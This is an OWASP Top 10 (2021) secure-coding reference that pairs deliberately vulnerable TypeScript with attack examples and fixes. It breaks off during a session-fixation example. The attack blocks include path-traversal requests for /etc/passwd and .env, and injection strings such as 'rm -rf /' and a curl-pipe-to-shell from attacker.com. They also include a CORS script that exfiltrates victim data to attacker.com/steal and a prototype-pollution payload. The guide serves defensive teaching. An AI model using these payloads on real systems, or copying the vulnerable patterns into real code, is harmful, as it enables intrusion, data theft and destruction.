# OWASP Top 10 Complete Reference (2021)

Comprehensive guide with vulnerable and secure code examples for every OWASP Top 10 vulnerability.

---

## A01: Broken Access Control

**Impact:** Unauthorized access to data, privilege escalation, data modification/deletion

### 1. Insecure Direct Object Reference (IDOR)

**Vulnerable Code:**
```typescript
// API route: /api/documents/[id]/route.ts
export async function GET(
  request: Request,
  { params }: { params: { id: string } }
) {
  // ❌ No authorization check - any authenticated user can access any document
  const document = await db.document.findUnique({
    where: { id: params.id },
  })

  if (!document) {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }

  return Response.json(document)
}
```

**Attack:**
```bash
# Attacker changes document ID in URL to access other users' documents
curl https://api.example.com/api/documents/user123-doc456
curl https://api.example.com/api/documents/admin-secret-doc  # Access admin document!
```

**Secure Code:**
```typescript
// API route: /api/documents/[id]/route.ts
export async function GET(
  request: Request,
  { params }: { params: { id: string } }
) {
  // ✅ Get authenticated user
  const session = await getAuthSession(request)
  if (!session?.user?.id) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // ✅ Verify ownership
  const document = await db.document.findUnique({
    where: {
      id: params.id,
      userId: session.user.id,  // Ensures user owns this document
    },
  })

  if (!document) {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }

  return Response.json(document)
}
```

### 2. Missing Function-Level Access Control

**Vulnerable Code:**
```typescript
// API route: /api/admin/users/route.ts
export async function DELETE(request: Request) {
  const { userId } = await request.json()

  // ❌ No admin check - any authenticated user can delete any user
  await db.user.delete({ where: { id: userId } })

  return Response.json({ success: true })
}
```

**Secure Code:**
```typescript
// API route: /api/admin/users/route.ts
export async function DELETE(request: Request) {
  const session = await getAuthSession(request)

  // ✅ Verify authentication
  if (!session?.user?.id) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // ✅ Verify admin role
  if (session.user.role !== 'ADMIN') {
    return Response.json({ error: 'Forbidden: Admin access required' }, { status: 403 })
  }

  const { userId } = await request.json()

  // ✅ Additional check: prevent self-deletion
  if (userId === session.user.id) {
    return Response.json({ error: 'Cannot delete your own account' }, { status: 400 })
  }

  await db.user.delete({ where: { id: userId } })

  // ✅ Log admin action
  await db.auditLog.create({
    data: {
      action: 'USER_DELETED',
      performedBy: session.user.id,
      targetUserId: userId,
      timestamp: new Date(),
    },
  })

  return Response.json({ success: true })
}
```

### 3. Path Traversal

**Vulnerable Code:**
```typescript
// API route: /api/files/[filename]/route.ts
export async function GET(
  request: Request,
  { params }: { params: { filename: string } }
) {
  // ❌ No validation - attacker can use "../" to access any file
  const filePath = path.join('/uploads', params.filename)
  const content = await fs.readFile(filePath, 'utf-8')

  return new Response(content)
}
```

**Attack:**
```bash
# Attacker uses path traversal to read sensitive files
curl https://api.example.com/api/files/../../etc/passwd
curl https://api.example.com/api/files/../../.env  # Read environment variables!
```

**Secure Code:**
```typescript
// API route: /api/files/[filename]/route.ts
import path from 'path'
import { z } from 'zod'

const UPLOAD_DIR = '/uploads'

// ✅ Validate filename pattern
const filenameSchema = z.string()
  .regex(/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|pdf)$/, 'Invalid filename format')
  .max(255)

export async function GET(
  request: Request,
  { params }: { params: { filename: string } }
) {
  // ✅ Validate filename
  const filename = filenameSchema.parse(params.filename)

  // ✅ Construct safe path
  const filePath = path.join(UPLOAD_DIR, filename)

  // ✅ Verify path is within upload directory (prevent path traversal)
  const realPath = await fs.realpath(filePath)
  const realUploadDir = await fs.realpath(UPLOAD_DIR)

  if (!realPath.startsWith(realUploadDir)) {
    return Response.json({ error: 'Invalid file path' }, { status: 400 })
  }

  // ✅ Check file exists
  const exists = await fs.access(filePath).then(() => true).catch(() => false)
  if (!exists) {
    return Response.json({ error: 'File not found' }, { status: 404 })
  }

  // ✅ Verify user authorization
  const session = await getAuthSession(request)
  if (!session?.user?.id) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // ✅ Check file ownership in database
  const file = await db.file.findUnique({
    where: { filename, userId: session.user.id },
  })

  if (!file) {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }

  const content = await fs.readFile(filePath)

  return new Response(content, {
    headers: {
      'Content-Type': file.mimeType,
      'Content-Disposition': `attachment; filename="${filename}"`,
    },
  })
}
```

---

## A02: Cryptographic Failures

**Impact:** Sensitive data exposure, credential theft, financial fraud

### 1. Weak Password Hashing

**Vulnerable Code:**
```typescript
// ❌ MD5 (broken, fast to crack)
import crypto from 'crypto'

export async function createUser(email: string, password: string) {
  const hashedPassword = crypto.createHash('md5').update(password).digest('hex')

  return db.user.create({
    data: { email, password: hashedPassword },
  })
}

// ❌ SHA256 (too fast, no salt)
const hashedPassword = crypto.createHash('sha256').update(password).digest('hex')

// ❌ Plain text (NEVER)
await db.user.create({
  data: { email, password },  // Storing plain text password!
})
```

**Attack:**
```bash
# MD5 rainbow table attack (millions of hashes/second)
echo -n "password123" | md5sum
# 482c811da5d5b4bc6d497ffa98491e38

# Attacker finds hash in database, looks up in rainbow table
# Result: "password123" revealed in milliseconds
```

**Secure Code:**
```typescript
import bcrypt from 'bcrypt'

// ✅ bcrypt with 12 rounds (2^12 = 4096 iterations)
export async function createUser(email: string, password: string) {
  const SALT_ROUNDS = 12  // Minimum recommended: 10-12

  // bcrypt automatically generates salt and applies it
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS)
  // Example output: $2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
  //                 └─┬─┘└─┬┘└──────────┬───────────┘└──────────┬──────────────┘
  //                   │   │            salt (22 chars)        hash (31 chars)
  //                   │   cost factor (2^12 iterations)
  //                   algorithm version

  return db.user.create({
    data: {
      email,
      password: hashedPassword,
    },
  })
}

// ✅ Verify password
export async function verifyPassword(password: string, hashedPassword: string): Promise<boolean> {
  // bcrypt automatically extracts salt and compares
  return bcrypt.compare(password, hashedPassword)
}

// ✅ Alternative: Argon2 (even stronger, winner of Password Hashing Competition)
import argon2 from 'argon2'

export async function createUserArgon2(email: string, password: string) {
  const hashedPassword = await argon2.hash(password, {
    type: argon2.argon2id,  // Hybrid of argon2i and argon2d
    memoryCost: 65536,      // 64 MB
    timeCost: 3,            // 3 iterations
    parallelism: 4,         // 4 threads
  })

  return db.user.create({
    data: { email, password: hashedPassword },
  })
}
```

### 2. Hardcoded Secrets

**Vulnerable Code:**
```typescript
// ❌ Hardcoded API keys
const OPENAI_API_KEY = 'sk-proj-abc123def456ghi789'
const STRIPE_SECRET_KEY = 'sk_live_abc123def456'
const JWT_SECRET = 'mysupersecretkey123'

// ❌ Committed .env file
// .env (in git repository)
DATABASE_URL="postgresql://admin:P@ssw0rd123@prod-db.example.com:5432/quetrex"
OPENAI_API_KEY="sk-proj-abc123def456ghi789"

// ❌ Secrets in client code
const config = {
  apiKey: 'AIzaSyD1234567890abcdefghijklmnop',  // Exposed in browser!
}
```

**Attack:**
```bash
# Search GitHub for leaked secrets
git clone https://github.com/company/app
grep -r "sk_live_" .
grep -r "OPENAI_API_KEY" .

# Find in commit history
git log -p | grep -i "password"
git log -p | grep "DATABASE_URL"
```

**Secure Code:**
```typescript
// ✅ Environment variables
const OPENAI_API_KEY = process.env.OPENAI_API_KEY
const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY
const JWT_SECRET = process.env.JWT_SECRET

// ✅ Validate on startup
if (!OPENAI_API_KEY || !STRIPE_SECRET_KEY || !JWT_SECRET) {
  throw new Error('Missing required environment variables')
}

// ✅ Never expose secrets to client
// src/app/api/openai/route.ts (Server-side only)
export async function POST(request: Request) {
  const apiKey = process.env.OPENAI_API_KEY!  // Server-side, not exposed

  const response = await fetch('https://api.openai.com/v1/chat/completions', {
    headers: {
      'Authorization': `Bearer ${apiKey}`,
    },
  })

  return response
}

// ✅ .gitignore
// .gitignore
.env
.env.local
.env.production
*.key
*.pem

// ✅ Example .env.example (template, no real values)
// .env.example
DATABASE_URL="postgresql://user:password@localhost:5432/quetrex"
OPENAI_API_KEY="sk-proj-YOUR_KEY_HERE"
STRIPE_SECRET_KEY="sk_test_YOUR_KEY_HERE"
JWT_SECRET="generate-random-string-here"
```

### 3. Weak Encryption

**Vulnerable Code:**
```typescript
import crypto from 'crypto'

// ❌ Weak algorithm (DES, RC4)
const cipher = crypto.createCipher('des', 'password')

// ❌ ECB mode (patterns leak information)
const cipher = crypto.createCipheriv('aes-256-ecb', key, null)

// ❌ Hardcoded key
const key = 'mysecretkey12345'
```

**Secure Code:**
```typescript
import crypto from 'crypto'

// ✅ AES-256-GCM (authenticated encryption)
export function encrypt(plaintext: string): {
  encrypted: string
  iv: string
  authTag: string
} {
  // ✅ Load key from environment (32 bytes for AES-256)
  const key = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex')

  // ✅ Generate random IV (initialization vector)
  const iv = crypto.randomBytes(16)

  // ✅ Create cipher with AES-256-GCM
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)

  // Encrypt
  let encrypted = cipher.update(plaintext, 'utf8', 'hex')
  encrypted += cipher.final('hex')

  // Get authentication tag
  const authTag = cipher.getAuthTag()

  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex'),
  }
}

export function decrypt(encrypted: string, iv: string, authTag: string): string {
  const key = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex')

  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(iv, 'hex')
  )

  decipher.setAuthTag(Buffer.from(authTag, 'hex'))

  let decrypted = decipher.update(encrypted, 'hex', 'utf8')
  decrypted += decipher.final('utf8')

  return decrypted
}

// Generate encryption key (run once, store in environment)
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---

## A03: Injection

**Impact:** Data breach, data loss, denial of service, server compromise

### 1. SQL Injection (Drizzle ORM)

**Vulnerable Code:**
```typescript
import { sql } from 'drizzle-orm'

// ❌ String concatenation in raw SQL
export async function getUser(email: string) {
  const query = sql`SELECT * FROM users WHERE email = '${email}'`
  return db.execute(query)
}
```

**Attack:**
```typescript
// Attacker input: admin@example.com' OR '1'='1
const email = "admin@example.com' OR '1'='1"
// Resulting query: SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
// Returns ALL users!

// Attacker input: '; DROP TABLE users; --
const email = "'; DROP TABLE users; --"
// Resulting query: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// Deletes entire users table!
```

**Secure Code:**
```typescript
import { db } from '@/lib/db'
import { users } from '@/lib/db/schema'
import { eq, and, or, sql } from 'drizzle-orm'

// ✅ Parameterized queries (preferred)
export async function getUser(email: string) {
  return db.select()
    .from(users)
    .where(eq(users.email, email))  // Automatically parameterized
    .limit(1)
}

// ✅ Multiple conditions
export async function getUsersByFilters(email: string, role: string) {
  return db.select()
    .from(users)
    .where(
      and(
        eq(users.email, email),
        eq(users.role, role)
      )
    )
}

// ✅ Complex queries with placeholders
export async function searchUsers(searchTerm: string) {
  return db.select()
    .from(users)
    .where(
      or(
        sql`${users.email} ILIKE ${`%${searchTerm}%`}`,
        sql`${users.name} ILIKE ${`%${searchTerm}%`}`
      )
    )
}

// ✅ Raw SQL with placeholders (only if needed)
export async function customQuery(userId: string) {
  return db.execute(
    sql`
      SELECT u.*, COUNT(p.id) as project_count
      FROM users u
      LEFT JOIN projects p ON p.user_id = u.id
      WHERE u.id = ${userId}
      GROUP BY u.id
    `
  )
}

// ❌ NEVER build queries like this
export async function dangerousQuery(sortBy: string) {
  // sortBy comes from user input, could be: "id; DROP TABLE users; --"
  return db.execute(sql`SELECT * FROM users ORDER BY ${sortBy}`)
}

// ✅ Whitelist dynamic values
export async function safeSort(sortBy: string) {
  const allowedColumns = ['email', 'name', 'createdAt'] as const
  type AllowedColumn = typeof allowedColumns[number]

  if (!allowedColumns.includes(sortBy as AllowedColumn)) {
    throw new Error('Invalid sort column')
  }

  // Now safe to use (validated against whitelist)
  return db.select()
    .from(users)
    .orderBy(sql.raw(sortBy))  // Only after validation!
}
```

### 2. Command Injection

**Vulnerable Code:**
```typescript
import { exec } from 'child_process'

// ❌ Unsanitized user input in shell command
export async function convertImage(filename: string) {
  exec(`convert uploads/${filename} output/${filename}.png`, (error, stdout, stderr) => {
    if (error) throw error
  })
}
```

**Attack:**
```bash
# Attacker input: image.jpg; rm -rf /
# Resulting command: convert uploads/image.jpg; rm -rf / output/image.jpg; rm -rf /.png
# Deletes entire filesystem!

# Attacker input: image.jpg && curl attacker.com/malware.sh | sh
# Downloads and executes malware
```

**Secure Code:**
```typescript
import { spawn } from 'child_process'
import path from 'path'
import { z } from 'zod'

// ✅ Validate filename
const filenameSchema = z.string()
  .regex(/^[a-zA-Z0-9_-]+\.(jpg|jpeg|png)$/)
  .max(255)

export async function convertImage(filename: string): Promise<void> {
  // ✅ Validate input
  const validFilename = filenameSchema.parse(filename)

  // ✅ Use spawn with array arguments (no shell interpretation)
  const inputPath = path.join('/uploads', validFilename)
  const outputPath = path.join('/output', `${validFilename}.png`)

  return new Promise((resolve, reject) => {
    const child = spawn('convert', [inputPath, outputPath], {
      shell: false,  // ✅ Disable shell
      timeout: 30000,  // ✅ Timeout after 30 seconds
    })

    child.on('exit', (code) => {
      if (code === 0) {
        resolve()
      } else {
        reject(new Error(`Conversion failed with code ${code}`))
      }
    })

    child.on('error', reject)
  })
}

// ✅ Alternative: Use libraries instead of shell commands
import sharp from 'sharp'

export async function convertImageSafe(filename: string) {
  const validFilename = filenameSchema.parse(filename)

  const inputPath = path.join('/uploads', validFilename)
  const outputPath = path.join('/output', `${validFilename}.png`)

  await sharp(inputPath)
    .png()
    .toFile(outputPath)
}
```

### 3. NoSQL Injection

**Vulnerable Code:**
```typescript
// ❌ Directly using user input in MongoDB query
export async function login(email: string, password: string) {
  const user = await db.collection('users').findOne({
    email: email,
    password: password,  // Never store plain text passwords!
  })

  return user
}
```

**Attack:**
```javascript
// Attacker sends: { "email": {"$ne": null}, "password": {"$ne": null} }
// Query becomes: db.users.findOne({ email: { $ne: null }, password: { $ne: null } })
// Returns first user in database!

// Attacker sends: { "email": "admin@example.com", "password": {"$gt": ""} }
// Bypasses password check
```

**Secure Code:**
```typescript
import { z } from 'zod'
import bcrypt from 'bcrypt'

// ✅ Validate input types
const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(128),
})

export async function login(email: unknown, password: unknown) {
  // ✅ Validate input structure (rejects objects, ensures strings)
  const validated = loginSchema.parse({ email, password })

  // ✅ Use ORM with type safety
  const user = await db.user.findUnique({
    where: { email: validated.email },
  })

  if (!user) {
    // ✅ Generic error (don't reveal "user not found" vs "wrong password")
    throw new Error('Invalid credentials')
  }

  // ✅ Compare hashed password
  const isValid = await bcrypt.compare(validated.password, user.password)

  if (!isValid) {
    throw new Error('Invalid credentials')
  }

  return user
}

// ✅ For MongoDB specifically, sanitize operators
export function sanitizeMongoInput(input: any): any {
  if (typeof input !== 'object' || input === null) {
    return input
  }

  if (Array.isArray(input)) {
    return input.map(sanitizeMongoInput)
  }

  const sanitized: any = {}
  for (const [key, value] of Object.entries(input)) {
    // Remove MongoDB operators
    if (key.startsWith('$')) {
      continue
    }

    sanitized[key] = sanitizeMongoInput(value)
  }

  return sanitized
}
```

---

## A04: Insecure Design

**Impact:** Business logic flaws, privilege escalation, fraud

### 1. Insufficient Rate Limiting

**Vulnerable Code:**
```typescript
// ❌ No rate limiting on password reset
export async function POST(request: Request) {
  const { email } = await request.json()

  const user = await db.user.findUnique({ where: { email } })

  if (user) {
    await sendPasswordResetEmail(user.email)
  }

  return Response.json({ success: true })
}
```

**Attack:**
```bash
# Attacker floods endpoint
for i in {1..1000000}; do
  curl -X POST https://api.example.com/api/auth/reset-password \
    -d '{"email":"victim@example.com"}'
done
# Victim receives 1 million password reset emails
# Email service bill: $10,000+
```

**Secure Code:**
```typescript
import { RateLimiterMemory } from 'rate-limiter-flexible'

// ✅ Rate limiter configuration
const rateLimiter = new RateLimiterMemory({
  points: 5,  // 5 attempts
  duration: 60 * 60,  // Per 1 hour
})

export async function POST(request: Request) {
  const { email } = await request.json()

  // ✅ Get client IP
  const ip = request.headers.get('x-forwarded-for') ||
             request.headers.get('x-real-ip') ||
             'unknown'

  try {
    // ✅ Check rate limit
    await rateLimiter.consume(ip)
  } catch (rateLimiterRes) {
    return Response.json(
      { error: 'Too many requests. Please try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': String(Math.ceil(rateLimiterRes.msBeforeNext / 1000)),
        },
      }
    )
  }

  const user = await db.user.findUnique({ where: { email } })

  if (user) {
    // ✅ Additional rate limit: max 3 resets per user per day
    const recentResets = await db.passwordReset.count({
      where: {
        userId: user.id,
        createdAt: {
          gte: new Date(Date.now() - 24 * 60 * 60 * 1000),
        },
      },
    })

    if (recentResets >= 3) {
      return Response.json(
        { error: 'Maximum password resets reached. Please contact support.' },
        { status: 429 }
      )
    }

    await sendPasswordResetEmail(user.email)
  }

  // ✅ Generic response (don't reveal if email exists)
  return Response.json({
    success: true,
    message: 'If that email exists, a reset link will be sent.',
  })
}
```

### 2. Race Conditions

**Vulnerable Code:**
```typescript
// ❌ Race condition in balance transfer
export async function transferFunds(fromUserId: string, toUserId: string, amount: number) {
  // Check balance
  const fromUser = await db.user.findUnique({ where: { id: fromUserId } })

  if (fromUser.balance < amount) {
    throw new Error('Insufficient funds')
  }

  // Transfer (two separate queries - race condition!)
  await db.user.update({
    where: { id: fromUserId },
    data: { balance: { decrement: amount } },
  })

  await db.user.update({
    where: { id: toUserId },
    data: { balance: { increment: amount } },
  })
}
```

**Attack:**
```bash
# Attacker sends two simultaneous requests
# Thread 1: Transfer $100 (balance = $100)
# Thread 2: Transfer $100 (balance = $100)
# Both check balance ($100 >= $100) ✓
# Both execute transfer
# Result: User spent $200 with only $100 balance!
```

**Secure Code:**
```typescript
// ✅ Atomic transaction with database-level check
export async function transferFunds(fromUserId: string, toUserId: string, amount: number) {
  return db.$transaction(async (tx) => {
    // ✅ Lock row for update
    const fromUser = await tx.$queryRaw<User[]>`
      SELECT * FROM users WHERE id = ${fromUserId} FOR UPDATE
    `

    if (fromUser[0].balance < amount) {
      throw new Error('Insufficient funds')
    }

    // ✅ Update with conditional check (atomic)
    const result = await tx.user.updateMany({
      where: {
        id: fromUserId,
        balance: { gte: amount },  // Double-check at database level
      },
      data: { balance: { decrement: amount } },
    })

    if (result.count === 0) {
      throw new Error('Insufficient funds')
    }

    await tx.user.update({
      where: { id: toUserId },
      data: { balance: { increment: amount } },
    })

    // ✅ Create audit record
    await tx.transaction.create({
      data: {
        fromUserId,
        toUserId,
        amount,
        timestamp: new Date(),
      },
    })
  })
}

// ✅ Alternative: Optimistic locking with version field
export async function transferFundsOptimistic(
  fromUserId: string,
  toUserId: string,
  amount: number
) {
  const MAX_RETRIES = 3

  for (let i = 0; i < MAX_RETRIES; i++) {
    try {
      return await db.$transaction(async (tx) => {
        const fromUser = await tx.user.findUnique({ where: { id: fromUserId } })

        if (fromUser.balance < amount) {
          throw new Error('Insufficient funds')
        }

        // ✅ Update only if version matches (detects concurrent modification)
        const updated = await tx.user.updateMany({
          where: {
            id: fromUserId,
            version: fromUser.version,
            balance: { gte: amount },
          },
          data: {
            balance: { decrement: amount },
            version: { increment: 1 },
          },
        })

        if (updated.count === 0) {
          throw new Error('Concurrent modification detected')
        }

        await tx.user.update({
          where: { id: toUserId },
          data: { balance: { increment: amount } },
        })
      })
    } catch (error) {
      if (error.message === 'Concurrent modification detected' && i < MAX_RETRIES - 1) {
        // Retry
        continue
      }
      throw error
    }
  }

  throw new Error('Transfer failed after retries')
}
```

---

## A05: Security Misconfiguration

**Impact:** Unauthorized access, information disclosure, system compromise

### 1. Verbose Error Messages

**Vulnerable Code:**
```typescript
// ❌ Exposes internal details
export async function GET(request: Request) {
  try {
    const data = await db.user.findMany()
    return Response.json(data)
  } catch (error: any) {
    return Response.json({
      error: error.message,  // Exposes stack trace, SQL queries, file paths!
      stack: error.stack,
    }, { status: 500 })
  }
}
```

**Attack Response:**
```json
{
  "error": "connect ECONNREFUSED 10.0.1.5:5432",
  "stack": "Error: connect ECONNREFUSED 10.0.1.5:5432\n    at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1595:16)\n    at /app/node_modules/@prisma/client/runtime/library.js:123:15\n    at PrismaClient.findMany (/app/src/lib/db.ts:45:3)"
}
```
**Information leaked:** Internal IP address, database port, file structure, dependency versions

**Secure Code:**
```typescript
import { logger } from '@/lib/logger'

// ✅ Generic error messages for production
export async function GET(request: Request) {
  try {
    const data = await db.user.findMany()
    return Response.json(data)
  } catch (error: any) {
    // ✅ Log detailed error internally
    logger.error('Database query failed', {
      error: error.message,
      stack: error.stack,
      query: 'users.findMany',
      timestamp: new Date().toISOString(),
    })

    // ✅ Return generic message to user
    const isDevelopment = process.env.NODE_ENV === 'development'

    return Response.json({
      error: isDevelopment
        ? error.message  // Only in development
        : 'An internal error occurred',  // Production
    }, { status: 500 })
  }
}
```

### 2. CORS Misconfiguration

**Vulnerable Code:**
```typescript
// ❌ Allow all origins
export function middleware(request: NextRequest) {
  const response = NextResponse.next()

  response.headers.set('Access-Control-Allow-Origin', '*')
  response.headers.set('Access-Control-Allow-Credentials', 'true')
  // DANGER: Allows any website to make authenticated requests!

  return response
}
```

**Attack:**
```html
<!-- Attacker's website: evil.com -->
<script>
// Victim visits evil.com while logged into app.quetrex.com
fetch('https://app.quetrex.com/api/user/data', {
  credentials: 'include'  // Includes victim's cookies
})
.then(r => r.json())
.then(data => {
  // Steal victim's data!
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  })
})
</script>
```

**Secure Code:**
```typescript
// ✅ Whitelist specific origins
const ALLOWED_ORIGINS = [
  'https://app.quetrex.com',
  'https://staging.quetrex.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean) as string[]

export function middleware(request: NextRequest) {
  const response = NextResponse.next()

  const origin = request.headers.get('origin')

  // ✅ Only allow whitelisted origins
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    response.headers.set('Access-Control-Allow-Origin', origin)
    response.headers.set('Access-Control-Allow-Credentials', 'true')
    response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
    response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization')
    response.headers.set('Access-Control-Max-Age', '86400')  // 24 hours
  }

  // ✅ Handle preflight requests
  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: response.headers })
  }

  return response
}
```

### 3. Missing Security Headers

**Vulnerable Code:**
```typescript
// ❌ No security headers
export function middleware(request: NextRequest) {
  return NextResponse.next()
}
```

**Secure Code:**
```typescript
// ✅ Comprehensive security headers
export function middleware(request: NextRequest) {
  const response = NextResponse.next()

  // ✅ Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff')

  // ✅ Prevent clickjacking
  response.headers.set('X-Frame-Options', 'DENY')

  // ✅ XSS protection (legacy browsers)
  response.headers.set('X-XSS-Protection', '1; mode=block')

  // ✅ Strict Transport Security (HTTPS only)
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  )

  // ✅ Referrer policy
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')

  // ✅ Content Security Policy
  response.headers.set(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net",
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data: https:",
      "connect-src 'self' https://api.openai.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; ')
  )

  // ✅ Permissions Policy (formerly Feature-Policy)
  response.headers.set(
    'Permissions-Policy',
    [
      'camera=()',
      'microphone=(self)',  // Allow microphone for voice feature
      'geolocation=()',
      'payment=()',
    ].join(', ')
  )

  return response
}
```

---

## A06: Vulnerable and Outdated Components

**Impact:** Known exploits, data breaches, system compromise

### Detection and Prevention

**Vulnerable Code:**
```json
// package.json
{
  "dependencies": {
    "express": "4.16.0",  // ❌ Has known CVEs
    "lodash": "4.17.11",  // ❌ Prototype pollution vulnerability
    "axios": "0.19.0"     // ❌ SSRF vulnerability
  }
}
```

**Attack:**
```javascript
// Exploiting lodash vulnerability (CVE-2019-10744)
const _ = require('lodash')

const maliciousPayload = JSON.parse('{"__proto__":{"isAdmin":true}}')
_.merge({}, maliciousPayload)

// Now all objects have isAdmin: true!
console.log({}.isAdmin)  // true (prototype pollution)
```

**Secure Code:**
```bash
# ✅ Regular dependency audits
npm audit --audit-level=moderate
npm audit fix

# ✅ Automated dependency updates
npm install -g npm-check-updates
ncu -u  # Update package.json
npm install

# ✅ Use Snyk for continuous monitoring
npm install -g snyk
snyk test  # Check for vulnerabilities
snyk monitor  # Continuous monitoring

# ✅ GitHub Dependabot (enable in repository settings)
# Automatically creates PRs for security updates
```

**package.json best practices:**
```json
{
  "dependencies": {
    "express": "^4.18.2",  // ✅ Use latest stable
    "lodash": "^4.17.21",  // ✅ Use latest stable
    "axios": "^1.6.2"      // ✅ Use latest stable
  },
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "check:updates": "ncu",
    "update:deps": "ncu -u && npm install"
  },
  "engines": {
    "node": ">=18.0.0",  // ✅ Specify minimum Node version
    "npm": ">=9.0.0"
  }
}
```

**CI/CD Integration:**
```yaml
# .github/workflows/security.yml
name: Security Audit

on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 0 * * 0'  # Weekly scan

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit
        run: npm audit --audit-level=moderate

      - name: Run Snyk test
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

## A07: Identification and Authentication Failures

**Impact:** Account takeover, identity theft, privilege escalation

### 1. Weak Password Policy

**Vulnerable Code:**
```typescript
// ❌ Weak password validation
const passwordSchema = z.string().min(6)

// Allows: "123456", "password", "aaaaaa"
```

**Secure Code:**
```typescript
// ✅ Strong password validation
const passwordSchema = z.string()
  .min(8, 'Password must be at least 8 characters')
  .max(128, 'Password must not exceed 128 characters')
  .regex(/[A-Z]/, 'Password must contain at least one uppercase letter')
  .regex(/[a-z]/, 'Password must contain at least one lowercase letter')
  .regex(/[0-9]/, 'Password must contain at least one number')
  .regex(/[^A-Za-z0-9]/, 'Password must contain at least one special character')
  .refine(
    (password) => !COMMON_PASSWORDS.includes(password.toLowerCase()),
    'Password is too common'
  )

// ✅ Check against compromised password database
import { pwnedPassword } from 'hibp'

async function validatePassword(password: string) {
  const validated = passwordSchema.parse(password)

  // Check if password appears in data breaches
  const pwned = await pwnedPassword(validated)
  if (pwned > 0) {
    throw new Error('This password has been compromised in a data breach')
  }

  return validated
}

// ✅ Common passwords list (first 100 most common)
const COMMON_PASSWORDS = [
  'password', '123456', '123456789', 'qwerty', 'abc123',
  'password1', '12345678', '111111', '123123', 'admin',
  // ... (load from file)
]
```

### 2. Missing Multi-Factor Authentication

**Vulnerable Code:**
```typescript
// ❌ Only username/password
export async function login(email: string, password: string) {
  const user = await db.user.findUnique({ where: { email } })

  if (!user || !await bcrypt.compare(password, user.password)) {
    throw new Error('Invalid credentials')
  }

  const token = await createSession(user.id)
  return { token, user }
}
```

**Secure Code:**
```typescript
import speakeasy from 'speakeasy'
import QRCode from 'qrcode'

// ✅ Enable TOTP (Time-based One-Time Password)
export async function enableMFA(userId: string) {
  // Generate secret
  const secret = speakeasy.generateSecret({
    name: 'Quetrex',
    issuer: 'Quetrex AI',
  })

  // Store secret
  await db.user.update({
    where: { id: userId },
    data: {
      mfaSecret: secret.base32,
      mfaEnabled: false,  // Enable after verification
    },
  })

  // Generate QR code for user to scan
  const qrCode = await QRCode.toDataURL(secret.otpauth_url!)

  return {
    secret: secret.base32,
    qrCode,
  }
}

// ✅ Verify TOTP token
export async function verifyMFA(userId: string, token: string): Promise<boolean> {
  const user = await db.user.findUnique({
    where: { id: userId },
    select: { mfaSecret: true },
  })

  if (!user?.mfaSecret) {
    throw new Error('MFA not enabled')
  }

  const verified = speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token,
    window: 2,  // Allow 2 time steps before/after (60 seconds)
  })

  return verified
}

// ✅ Login with MFA
export async function login(email: string, password: string, mfaToken?: string) {
  const user = await db.user.findUnique({ where: { email } })

  if (!user || !await bcrypt.compare(password, user.password)) {
    throw new Error('Invalid credentials')
  }

  // ✅ Require MFA if enabled
  if (user.mfaEnabled) {
    if (!mfaToken) {
      return {
        requiresMFA: true,
        userId: user.id,
      }
    }

    const mfaValid = await verifyMFA(user.id, mfaToken)
    if (!mfaValid) {
      throw new Error('Invalid MFA token')
    }
  }

  const token = await createSession(user.id)

  return {
    requiresMFA: false,
    token,
    user: {
      id: user.id,
      email: user.email,
      name: user.name,
    },
  }
}
```

### 3. Session Fixation

**Vulnerable Code:**
```typescript
// ❌ Reuse session ID after login
export async function login(request: Request, email: string, password: string) {
  const user = await validateCredentials(email, password)

  // ❌ Keep existing session ID (attacker can fixate this)
  const sessionId = request.cookies.get('sessionId')?.value || generateSessionId()

  await db.session.upsert({
    where: { id: sessionId },
    create: { id: sessionId, userId: user.id },
    update: { userId: user.id },
  })

  return Response.json({ success: true })
}
```

**Attack:**
```bash
# 1. Attacker gets session ID
curl https://app.quetrex.com/login
